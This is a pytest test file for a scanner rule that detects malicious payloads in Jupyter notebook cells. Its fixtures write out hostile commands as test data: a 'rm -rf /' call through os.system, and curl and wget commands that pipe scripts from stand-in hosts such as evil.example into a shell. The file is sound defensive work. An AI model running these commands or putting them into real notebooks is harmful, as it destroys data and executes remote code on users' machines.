import json
from pathlib import Path

from guardana.core.rule import RuleContext
from guardana.core.target import ArtifactTarget
from guardana.rules.supply_chain.notebook_payload import NotebookPayloadRule


def _notebook(*cell_sources: str) -> str:
    cells = [{"cell_type": "code", "source": src} for src in cell_sources]
    return json.dumps({"cells": cells, "nbformat": 4})


def _findings(tmp_path: Path) -> list[tuple[str, str]]:
    rule = NotebookPayloadRule()
    return [
        (f.severity.name, f.evidence.summary)
        for f in rule.run(ArtifactTarget(tmp_path), RuleContext())
    ]


def test_flags_python_code_sink_in_a_cell(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("import os\nos.system('rm -rf /')\n"))
    findings = _findings(tmp_path)
    assert any(sev == "HIGH" and "os.system" in why for sev, why in findings)


def test_flags_curl_pipe_to_shell_escape(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("!curl https://evil.example/x.sh | sh\n"))
    findings = _findings(tmp_path)
    assert any(sev == "HIGH" and "shell" in why for sev, why in findings)


def test_flags_pipe_to_shell_in_a_bash_cell_magic(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(_notebook("%%bash\nwget -qO- https://evil/x | bash\n"))
    assert any(sev == "HIGH" for sev, _ in _findings(tmp_path))


def test_source_as_list_of_lines_is_handled(tmp_path: Path) -> None:
    cells = [{"cell_type": "code", "source": ["import os\n", "os.system('id')\n"]}]
    (tmp_path / "nb.ipynb").write_text(json.dumps({"cells": cells}))
    assert any("os.system" in why for _, why in _findings(tmp_path))


def test_benign_notebook_is_clean(tmp_path: Path) -> None:
    (tmp_path / "nb.ipynb").write_text(
        _notebook("import numpy as np\nx = np.zeros(3)\n", "!pip install numpy\nprint(x)\n")
    )
    assert _findings(tmp_path) == []


def test_unparseable_cell_is_surfaced_not_silently_skipped(tmp_path: Path) -> None:
    # A cell of Python that does not parse is not proven clean — it must appear as
    # a visible (LOW) lead, never be dropped into silence.
    (tmp_path / "nb.ipynb").write_text(_notebook("def (this is not valid python\n"))
    findings = _findings(tmp_path)
    assert any(sev == "LOW" and "could not be parsed" in why for sev, why in findings)


def test_markdown_cells_are_ignored(tmp_path: Path) -> None:
    cells = [{"cell_type": "markdown", "source": "os.system('x') in prose\n"}]
    (tmp_path / "nb.ipynb").write_text(json.dumps({"cells": cells}))
    assert _findings(tmp_path) == []
